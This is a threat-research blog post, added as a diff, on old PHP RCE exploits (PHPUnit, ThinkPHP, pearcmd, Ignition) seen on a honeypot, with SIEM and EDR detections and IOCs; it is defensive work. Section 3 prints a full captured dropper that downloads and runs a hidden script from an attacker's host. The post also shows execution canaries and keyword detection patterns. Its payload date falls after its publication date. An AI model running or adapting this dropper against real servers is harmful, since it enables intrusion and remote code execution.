@@ -1,0 +1,362 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Detecting PHPUnit, ThinkPHP, pearcmd and Ignition RCE Attempts in Splunk and Sentinel | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/detect-legacy-php-rce/">
+<meta name="description" content="PHPUnit eval-stdin, ThinkPHP invokefunction, pearcmd, Laravel Ignition, PHP-CGI and the Apache traversal made up 585 requests to my honeypot. I break down the payloads, including a dropper that reports back at every stage, and give behavioural detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/detect-legacy-php-rce/">
+<meta property="og:title" content="Detecting PHPUnit, ThinkPHP, pearcmd and Ignition RCE Attempts in Splunk and Sentinel | Global SOC">
+<meta property="og:description" content="PHPUnit eval-stdin, ThinkPHP invokefunction, pearcmd, Laravel Ignition, PHP-CGI and the Apache traversal made up 585 requests to my honeypot. I break down the payloads, including a dropper that reports back at every stage, and give behavioural detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Detecting PHPUnit, ThinkPHP, pearcmd and Ignition RCE Attempts in Splunk and Sentinel | Global SOC">
+<meta name="twitter:description" content="PHPUnit eval-stdin, ThinkPHP invokefunction, pearcmd, Laravel Ignition, PHP-CGI and the Apache traversal made up 585 requests to my honeypot. I break down the payloads, including a dropper that reports back at every stage, and give behavioural detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/detect-legacy-php-rce/#article",
+      "url": "https://globalsoc.com.au/blog/detect-legacy-php-rce/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/detect-legacy-php-rce/"
+      },
+      "headline": "Six Old PHP Exploits Still Sprayed Daily: How to Detect the Attempt, the Check and the Dropper",
+      "description": "PHPUnit eval-stdin, ThinkPHP invokefunction, pearcmd, Laravel Ignition, PHP-CGI and the Apache traversal made up 585 requests to my honeypot. I break down the payloads, including a dropper that reports back at every stage, and give behavioural detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.",
+      "datePublished": "2026-11-04",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Six Old PHP Exploits Still Sprayed Daily: How to Detect the Attempt, the Check and the Dropper",
+          "item": "https://globalsoc.com.au/blog/detect-legacy-php-rce/"
+        }
+      ]
+    }
+  ]
+}
+</script>
+<meta property="article:published_time" content="2026-11-04">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="author" content="Yogesh">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f5f7fa;color:#142333;font:17px/1.75 system-ui,sans-serif}
+header{background:#0b2436;color:white;padding:25px max(24px,calc((100vw - 1000px)/2))}
+header a{color:#a6e3ff;text-decoration:none}
+header a:hover{text-decoration:underline}
+main{max-width:1000px;margin:auto;padding:40px 24px 80px}
+h1{font-size:clamp(34px,5vw,52px);line-height:1.15;letter-spacing:-.035em;margin:16px 0 20px}
+h2{margin-top:52px;line-height:1.3;font-size:28px;border-bottom:1px solid #d6e1e9;padding-bottom:8px}
+h3{margin-top:32px;font-size:20px}
+p{max-width:82ch;margin:16px 0}
+pre{background:#10283a;color:#e3f2fc;padding:20px;border-radius:10px;overflow:auto;font:13.5px/1.65 Consolas,monospace;white-space:pre-wrap;overflow-wrap:anywhere}
+code{font-family:Consolas,monospace;background:#e9f0f5;color:#0b2436;padding:2px 6px;border-radius:4px;font-size:0.9em}
+pre code{background:transparent;color:inherit;padding:0}
+a{color:#076383}
+nav.toc{background:#e6f0f5;border-left:4px solid #087da4;padding:16px 22px;margin:24px 0}
+.meta{color:#47687c;font-size:14px;font-weight:600;letter-spacing:0.04em}
+table{width:100%;border-collapse:collapse;background:white;font-size:15px;margin:20px 0}
+td,th{padding:12px;border:1px solid #d6e1e9;text-align:left}
+th{background:#edf3f7}
+td code{overflow-wrap:anywhere}
+.alert-box{background:#f0fdf4;border-left:4px solid #16a34a;padding:16px 20px;border-radius:4px;margin:20px 0}
+.warn-box{background:#fef2f2;border-left:4px solid #dc2626;padding:16px 20px;border-radius:4px;margin:20px 0}
+@media(max-width:640px){table{font-size:12px}td,th{padding:6px}}
+.bar{fill:#087da4}.small{font-size:14px;color:#47687c}
+.org{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:6px;letter-spacing:.03em;vertical-align:1px}
+.orgA{background:#fde7d9;color:#7a2e0b}.orgB{background:#dbeafe;color:#1e3a8a}
+.kc{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:8px;background:#0b2436;color:#a6e3ff;vertical-align:3px;letter-spacing:.03em}
+ul,ol{max-width:82ch}li{margin:6px 0}
+</style>
+</head>
+<body>
+<header>
+  <div style="display:flex;justify-content:space-between;align-items:center;">
+    <div><a href="/">Global SOC</a> / <a href="/blog/">Blog</a></div>
+    <div><a href="/dnsaudit/">DNS Audit</a></div>
+  </div>
+</header>
+<main>
+<p class="meta">THREAT RESEARCH &amp; LABS · Yogesh · 4 November 2026</p>
+<h1>Six Old PHP Exploits Still Sprayed Daily: How to Detect the Attempt, the Check and the Dropper</h1>
+<p>PHPUnit eval-stdin, ThinkPHP invokefunction, pearcmd, Laravel Ignition, PHP-CGI and the Apache traversal made up 585 requests to my honeypot. I break down the payloads, including a dropper that reports back at every stage, and give behavioural detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.</p>
+<nav class="toc"><strong>Key Sections:</strong> What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web-Layer Detections · Endpoint Detections · When It Fires · Hardening · IOCs</nav>
+<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. The web-layer KQL ran against the honeypot's real logs. The endpoint queries are written from the payloads shown here, so adapt the field names to your environment.</p>
+
+<h2 id="what">1. What Hit the Server</h2>
+
+<p>I built the honeypot to attract exploits for two PHP bugs from October 2026. Most of the code-execution attempts it got were for much older ones:</p>
+
+<table><thead><tr><th>Technique</th><th>Identifier</th><th>Disclosed</th><th>Requests</th><th>Source IPs</th><th>Status codes returned</th></tr></thead><tbody>
+<tr><td>PHPUnit eval-stdin.php</td><td>CVE-2017-9841</td><td>2017</td><td>430</td><td>20</td><td>404 x 430</td></tr>
+<tr><td>PHP-CGI argument injection</td><td>CVE-2012-1823 / CVE-2024-4577</td><td>2012 / 2024</td><td>59</td><td>12</td><td>200 x 35, 404 x 24</td></tr>
+<tr><td>Apache httpd path traversal to /bin/sh</td><td>CVE-2021-41773 / CVE-2021-42013</td><td>2021</td><td>29</td><td>16</td><td>400 x 29</td></tr>
+<tr><td>ThinkPHP 5 invokefunction</td><td>CNVD-2018-24942</td><td>2018</td><td>25</td><td>13</td><td>200 x 12, 400 x 2, 404 x 11</td></tr>
+<tr><td>pearcmd.php through a file-include parameter</td><td>no CVE (technique)</td><td>2021</td><td>11</td><td>11</td><td>200 x 11</td></tr>
+<tr><td>Laravel Ignition execute-solution</td><td>CVE-2021-3129</td><td>2021</td><td>3</td><td>3</td><td>404 x 3</td></tr>
+</tbody></table>
+
+<p>Of 585 requests for these techniques, 523 came from the twelve RedTail bot IPs, which have <a href="/blog/detect-redtail-cryptominer/">their own post</a>. This post covers the techniques themselves and the other actors using them. One of those actors sent the most interesting payload in the set: a dropper that phones home at every stage, so its operator can watch a conversion funnel.</p>
+
+<p>None of these exploits can work against my server: no PHPUnit, no ThinkPHP, no Laravel, no php-cgi, and a patched Apache. But they work against plenty of real servers, and their payloads show a defender exactly what to look for.</p>
+
+<h2 id="steps">2. The Attack, Step by Step</h2>
+
+<h3><span class="kc">Exploit</span> Step 1: Find a code-execution entry point</h3>
+<ul>
+<li><strong>PHPUnit <code>eval-stdin.php</code> (CVE-2017-9841):</strong> a test helper that runs whatever PHP you POST to it. It only matters if <code>vendor/</code> is inside the web root. The bots tried 41 install paths, one per framework layout.</li>
+<li><strong>ThinkPHP 5 <code>invokefunction</code> (CVE-2018-20062):</strong> the routing parameter can reach any PHP function.</li>
+<li><strong>pearcmd.php through a file include:</strong> on the official PHP Docker images, an LFI plus <code>pearcmd</code>'s <code>config-create</code> writes an attacker-controlled PHP file to <code>/tmp</code>, which the next request includes (T1505.003).</li>
+<li><strong>Laravel Ignition (CVE-2021-3129):</strong> the debug page's <code>execute-solution</code> endpoint, abused with <code>php://filter</code> chains.</li>
+<li><strong>PHP-CGI argument injection and Apache 2.4.49/50 traversal:</strong> covered in the RedTail post.</li>
+</ul>
+<p>All of them are T1190 Exploit Public-Facing Application.</p>
+
+<h3><span class="kc">Exploit</span> Step 2: "Did it work?"</h3>
+<p>Every bot sends a harmless check first and reads the response. These checks are easy to spot in logs:</p>
+<table><thead><tr><th>Check</th><th>Example</th><th>Why it's built that way</th></tr></thead><tbody>
+<tr><td>MD5 canary</td><td><code>echo(md5("Hello PHPUnit"))</code></td><td>The hash only appears in the response if the code ran</td></tr>
+<tr><td>Arithmetic canary</td><td><code>63187*52324</code> → <code>3306196588</code></td><td>The answer isn't in the request, so a page that just reflects input can't fake it</td></tr>
+<tr><td>Marker + system info</td><td><code>"SNIPPER_OK_" . php_uname("a")</code></td><td>Confirms execution and fingerprints the kernel in one go</td></tr>
+<tr><td><code>${IFS}</code></td><td><code>wget${IFS}-qO-</code></td><td>Replaces spaces so a shell command survives in a URL</td></tr>
+</tbody></table>
+
+<h3><span class="kc">Delivery + C2</span> Step 3: A dropper with a conversion funnel</h3>
+<p>On 8 November, <code>195.178.110.78</code> skipped the check and sent this straight to PHPUnit:</p>
+<pre><code>POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Content-Type: text/plain
+
+&lt;?php system("(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1);sleep 5;cd /tmp||cd /dev/shm;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/system/bin:/system/xbin:$PATH;(/bin/busybox wget -qO.y hxxp://77.239.124.167/s||wget -qO.y hxxp://77.239.124.167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167/s);test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s);test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1);/bin/sh .y||/system/bin/sh .y||sh .y||/bin/busybox sh .y||busybox sh .y;(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)"); ?&gt;</code></pre>
+<p>Laid out one step per line:</p>
+<pre><code>(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1);
+sleep 5;
+cd /tmp||cd /dev/shm;
+export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/system/bin:/system/xbin:$PATH;
+(/bin/busybox wget -qO.y hxxp://77.239.124.167/s||wget -qO.y hxxp://77.239.124.167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167/s);
+test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s);
+test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1);
+/bin/sh .y||/system/bin/sh .y||sh .y||/bin/busybox sh .y||busybox sh .y;
+(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)</code></pre>
+<p>The design is clever. Before downloading anything, it requests <code>/b/e/$(uname -n)</code> ("executed") with the victim's hostname in the URL. Then <code>/b/f/</code> (fetched), <code>/b/r/</code> (ran) or <code>/b/n/</code> (nothing worked). The operator's own web log becomes a dashboard showing every host where the exploit landed and how far it got (T1071.001). Every download is tried three ways (<code>busybox wget</code>, <code>wget</code>, <code>curl</code>), on two ports, and the <code>PATH</code> includes Android's <code>/system/bin</code>. It's built to run on anything from a cloud VM to a set-top box (T1105).</p>
+
+<h3><span class="kc">Installation</span> Step 4: Hidden script in /tmp</h3>
+<p>The second stage lands as <code>/tmp/.y</code> (or in <code>/dev/shm</code>) and is run with <code>sh .y</code> (T1564.001, T1059.004). I didn't fetch it. Whatever it is, the steps up to here are what you can detect.</p>
+
+<h2 id="pyramid">3. Pyramid of Pain</h2>
+<table><thead><tr><th>Level</th><th>Indicator</th><th>What I'd do with it</th></tr></thead><tbody>
+<tr><td>IP addresses</td><td>Staging host <code>77.239.124[.]167</code> (ports 80, 8099, 23413); callback <code>178.83.188[.]141:8880</code></td><td>Block at egress. They'll move.</td></tr>
+<tr><td>Host artefacts</td><td><code>/tmp/.y</code>, <code>/tmp/index1.php</code></td><td>Cheap hunt. Trivially renamed.</td></tr>
+<tr><td>Network artefacts</td><td>Beacon paths <code>/b/e/</code>, <code>/b/f/</code>, <code>/b/r/</code>, <code>/b/n/</code>; canary strings</td><td>Good proxy and web-log signatures. Canaries are fairly stable because the bots' result parsers depend on them.</td></tr>
+<tr><td>Tools</td><td>Path lists for <code>eval-stdin.php</code>; <code>pearcmd</code> config-create; Ignition filter chains</td><td>Detect the attempt by the exploit's shape, regardless of the path.</td></tr>
+<tr><td>TTPs</td><td>PHP or shell code inside an HTTP request; a shell pipeline with hostname substitution and a multi-tool download fallback; a hidden script run from <code>/tmp</code></td><td>Highest value. These hold across every PHP RCE, old or new.</td></tr>
+</tbody></table>
+
+<h2 id="web">4. Web-Layer Detections</h2>
+<p>For Org B I've parsed the honeypot's nginx log into a <code>WebAccess</code> function. For Org A I've used the CIM <code>Web</code> data model, or the raw nginx index when we need the request body.</p>
+<pre><code>let WebAccess = Syslog
+| where SyslogMessage startswith "php_http: "
+| extend j = parse_json(substring(SyslogMessage, 10))
+| project TimeGenerated, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
+          Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
+          UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);</code></pre>
+
+<h3>W1. PHPUnit eval-stdin.php (CVE-2017-9841)</h3>
+<p><span class="org orgB">Org B</span> Tested: 448 requests from 21 sources across 41 paths. None got a 200.</p>
+<pre><code>WebAccess
+| where Url has "eval-stdin.php"
+| summarize Requests = count(), Sources = dcount(SrcIp), Paths = dcount(Url),
+            WithBody = countif(isnotempty(Body)), Answered200 = countif(Status == 200)</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>| tstats count values(Web.status) as status dc(Web.url) as paths from datamodel=Web
+    where Web.url="*eval-stdin.php*" by Web.src Web.dest
+| rename Web.* as *
+| eval answered_200=if(mvfind(status, "^200$") &gt;= 0, "YES", "no")</code></pre>
+<p>A 404 is noise. A 200 on this path means <code>vendor/</code> is exposed, and that's critical whether or not the payload ran.</p>
+
+<h3>W2. Code inside an HTTP request (T1190): the general rule</h3>
+<p><span class="org orgB">Org B</span> Tested: 558 requests from 22 sources. 72 got a 200 and none executed. The 200s were the home page answering a query string it ignores.</p>
+<pre><code>WebAccess
+| extend Hay = strcat(Request, " ", Body)
+| where Hay has_any ("&lt;?php", "&lt;?=", "&lt;?echo", "%3C%3Fphp", "call_user_func", "shell_exec", "system(",
+                     "passthru", "base64_decode", "auto_prepend_file", "php://input", "php://filter")
+| summarize Requests = count(), Sources = dcount(SrcIp), Answered200 = countif(Status == 200)</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=web sourcetype=nginx:access
+    ("&lt;?php" OR "&lt;?=" OR "&lt;?echo" OR "%3C%3Fphp" OR "call_user_func" OR "shell_exec" OR "system("
+     OR "passthru" OR "base64_decode" OR "auto_prepend_file" OR "php://input" OR "php://filter")
+| stats count dc(clientip) as sources count(eval(status=200)) as answered_200 by host</code></pre>
+<p>PHP tags, <code>php://</code> wrappers and command functions have no business in a URL or form body. This one rule covers every exploit in this post and the next zero-day that uses the same building blocks. Expect false positives from security-content sites, code-sharing forums, and your own scanner. Tune per application.</p>
+
+<h3>W3. Execution canaries</h3>
+<p><span class="org orgB">Org B</span> Tested:</p>
+<table><thead><tr><th>Check</th><th>Requests</th><th>Sources</th></tr></thead><tbody>
+<tr><td>MD5 canary</td><td>466</td><td>12</td></tr>
+<tr><td><code>${IFS}</code> space bypass</td><td>19</td><td>2</td></tr>
+<tr><td>Hostname beacon</td><td>19</td><td>2</td></tr>
+<tr><td>PAST marker</td><td>4</td><td>4</td></tr>
+<tr><td>Arithmetic canary</td><td>2</td><td>1</td></tr>
+<tr><td>SNIPPER_OK marker</td><td>2</td><td>1</td></tr>
+</tbody></table>
+<pre><code>WebAccess
+| extend Hay = strcat(Request, " ", Body)
+| extend Check = case(
+    Hay has "md5(" and Hay has "Hello", "md5 canary",
+    Hay has "SNIPPER_OK_", "SNIPPER_OK marker",
+    Hay has "63187*52324" or Hay has "63187%2A52324", "arithmetic canary",
+    Hay matches regex @"echo\s*['""]?PAST", "PAST marker",
+    Hay has "${IFS}", "${IFS} space bypass",
+    Hay has_any ("uname -n", "uname%20-n", "$(uname"), "hostname beacon",
+    "")
+| where isnotempty(Check)
+| summarize Requests = count(), Sources = dcount(SrcIp) by Check
+| order by Requests desc</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=web sourcetype=nginx:access
+| eval hay=_raw
+| eval check=case(
+    match(hay, "md5\(") AND match(hay, "Hello"), "md5 canary",
+    match(hay, "SNIPPER_OK_"),                    "SNIPPER_OK marker",
+    match(hay, "63187(\*|%2A)52324"),            "arithmetic canary",
+    match(hay, "echo\s*['\"]?PAST"),             "PAST marker",
+    match(hay, "\$\{IFS\}"),                     "${IFS} space bypass",
+    match(hay, "uname(%20| )-n|\$\(uname"),      "hostname beacon")
+| where isnotnull(check)
+| stats count dc(clientip) as sources by check</code></pre>
+<p>If you can see response bodies (a WAF or a reverse proxy with response logging), the stronger version looks for the <em>answer</em> going out: the MD5 hashes, <code>3306196588</code>, <code>SNIPPER_OK_Linux</code>. A canary answer in a response means code ran. That's critical.</p>
+
+<h3>W4. pearcmd and Ignition</h3>
+<p><span class="org orgB">Org B</span> Tested: 11 pearcmd writes, 2 Ignition <code>execute-solution</code> attempts and 1 health check.</p>
+<pre><code>WebAccess
+| where Url has_any ("pearcmd", "/_ignition/execute-solution", "/_ignition/health-check")
+| extend Technique = case(Url has "pearcmd", "pearcmd config-create",
+                          Url has "execute-solution", "Ignition execute-solution", "Ignition health-check")
+| summarize Requests = count(), Sources = dcount(SrcIp) by Technique</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>| tstats count dc(Web.src) as sources from datamodel=Web
+    where (Web.url="*pearcmd*" OR Web.url="*/_ignition/execute-solution*" OR Web.url="*/_ignition/health-check*")
+    by Web.dest Web.url Web.status</code></pre>
+
+<h2 id="endpoint">5. Endpoint Detections</h2>
+<p>If any of these exploits lands, PHP runs a shell. Start with the <a href="/blog/detect-redtail-cryptominer/">web-server-spawns-a-shell rule from the RedTail post</a>, which applies to every exploit here. These three add coverage for this post's dropper specifically.</p>
+
+<h3>E1. Hostname-beacon and download-fallback pipelines (T1105, T1071.001)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    FileName IN ("sh","bash","dash","busybox","wget","curl")
+    (CommandLine="*$(uname -n)*" OR CommandLine="*`uname -n`*" OR CommandLine="*$(hostname)*"
+     OR CommandLine="*busybox wget*" OR CommandLine="*${IFS}*")
+| table _time ComputerName UserName GrandParentBaseFileName ParentBaseFileName FileName CommandLine</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where FileName in~ ("sh","bash","dash","busybox","wget","curl")
+| where ProcessCommandLine has_any ("$(uname -n)", "`uname -n`", "$(hostname)", "busybox wget", "${IFS}")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName,
+          InitiatingProcessFileName, FileName, ProcessCommandLine</code></pre>
+<p><code>$(uname -n)</code> inside a download URL, <code>busybox wget</code> on a server that has real <code>wget</code>, and <code>${IFS}</code> are all bot fingerprints. They're very rare in admin scripts. High severity.</p>
+
+<h3>E2. Hidden or temp-path script run by a shell (T1564.001, T1059.004)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    FileName IN ("sh","bash","dash","busybox")
+| rex field=CommandLine "^(?:\S*/)?(?:sh|bash|dash|busybox sh)\s+(?&lt;script&gt;\S+)"
+| where match(script, "(^|/)\.[^/]+$") OR match(script, "^/(tmp|dev/shm|var/tmp)/")
+| table _time ComputerName UserName ParentBaseFileName CommandLine script</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where FileName in~ ("sh","bash","dash","busybox")
+| extend Script = extract(@"(?:^|/)(?:sh|bash|dash|busybox sh)\s+(\S+)", 1, ProcessCommandLine)
+| where Script matches regex @"(^|/)\.[^/]+$" or Script matches regex @"^/(tmp|dev/shm|var/tmp)/"
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine, Script</code></pre>
+<p><code>sh .y</code>, <code>sh /tmp/x</code>, <code>bash /dev/shm/.a</code>: legitimate software almost never runs scripts like this. Some installers do it from <code>/tmp</code> with a visible name, so you might allowlist those by parent, but a dot-name is close to a guaranteed hit.</p>
+
+<h3>E3. PHP file written to /tmp or the web root by the web server (T1505.003)</h3>
+<p><span class="org orgA">Org A</span> Falcon's file-write event names vary by sensor version and platform. Check which of these your FDR feed carries:</p>
+<pre><code>index=crowdstrike event_platform=Lin
+    event_simpleName IN ("NewScriptWritten","NewExecutableWritten","WebScriptFileWritten")
+    (TargetFileName="/tmp/*.php" OR TargetFileName="/var/tmp/*.php" OR TargetFileName="/dev/shm/*.php"
+     OR TargetFileName="/var/www/*.php")
+| table _time ComputerName ContextProcessId_decimal TargetFileName</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceFileEvents
+| where Timestamp &gt; ago(7d)
+| where ActionType in ("FileCreated", "FileModified")
+| where FileName endswith ".php"
+| where FolderPath startswith "/tmp/" or FolderPath startswith "/var/tmp/" or FolderPath startswith "/dev/shm/"
+     or (FolderPath startswith "/var/www/" and InitiatingProcessFileName in~ ("php","php-fpm","apache2","httpd"))
+| project Timestamp, DeviceName, FolderPath, InitiatingProcessAccountName,
+          InitiatingProcessFileName, InitiatingProcessCommandLine</code></pre>
+<p>This catches the pearcmd trick (<code>/tmp/index1.php</code>) and web shells in general. Deployment tools write PHP into the web root too, so scope the web-root half of the rule to writes made by the web server process itself.</p>
+
+<h2 id="respond">6. When It Fires</h2>
+<ol>
+<li><strong>Web-layer only:</strong> confirm the target doesn't run the vulnerable component. Look for <code>vendor/</code> in the web root, ThinkPHP, debug mode, or php-cgi. If it's clean, close the alert. If it isn't, fix it today.</li>
+<li><strong>A W1 200, a W3 answer in a response, or any E rule:</strong> assume execution. <span class="org orgA">Org A</span> Network-contain the host in Falcon. <span class="org orgB">Org B</span> Isolate it in Defender.</li>
+<li><strong>Follow the funnel.</strong> Search proxy, firewall and DNS logs for requests to the staging host. With this dropper, the <code>/b/e/</code>, <code>/b/f/</code> and <code>/b/r/</code> requests tell you exactly how far it got on each host.</li>
+<li><strong>Collect <code>/tmp/.y</code></strong> (or whatever E2 names) before rebuilding. Falcon RTR <code>get</code>, or a Defender live response <code>getfile</code>.</li>
+<li><strong>Rebuild</strong> and rotate anything the web user could read.</li>
+</ol>
+
+<h2 id="harden">7. Hardening</h2>
+<ul>
+<li>Deploy with <code>composer install --no-dev</code>, and deny <code>/vendor/</code> at the web server.</li>
+<li>Upgrade ThinkPHP past 5.0.23 / 5.1.31. Turn Laravel debug off in production. Remove Ignition from production builds.</li>
+<li>On PHP Docker images, remove PEAR if you don't use it, or set <code>register_argc_argv=Off</code>.</li>
+<li>Mount <code>/tmp</code> and <code>/dev/shm</code> noexec. Block outbound connections from the web tier except to known destinations.</li>
+</ul>
+
+<h2 id="iocs">8. IOCs</h2>
+<table><thead><tr><th>Type</th><th>Value</th><th>Seen in</th></tr></thead><tbody>
+<tr><td>Staging host</td><td><code>77.239.124[.]167</code> ports 80, 8099, 23413</td><td>PHPUnit and ThinkPHP dropper from <code>195.178.110.78</code></td></tr>
+<tr><td>URL paths</td><td><code>/b/e/</code>, <code>/b/f/</code>, <code>/b/r/</code>, <code>/b/n/</code> + hostname; <code>/s</code>; <code>/k/a56f1a4933ad0bca/s</code></td><td>Same</td></tr>
+<tr><td>File</td><td><code>.y</code> in <code>/tmp</code> or <code>/dev/shm</code></td><td>Same</td></tr>
+<tr><td>Callback</td><td><code>178.83.188[.]141:8880</code>, path <code>/t/&lt;24 hex&gt;</code></td><td>PHPUnit and Ignition from <code>92.118.39.92</code></td></tr>
+<tr><td>Canaries</td><td><code>SNIPPER_OK_</code>, <code>PAST</code> + 6 digits, <code>3306196588</code>, MD5 of <code>Hello PHPUnit</code> / <code>Hello</code> / <code>hi</code></td><td>Execution checks</td></tr>
+</tbody></table>
+<aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
+<footer>
+  <div style="max-width:1000px;margin:auto;padding:20px 24px;border-top:1px solid #d6e1e9;font-size:14px;color:#47687c;">
+    © 2026 Global SOC Pty Ltd · <a href="/privacy.html">Privacy Policy</a>
+  </div>
+</footer>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
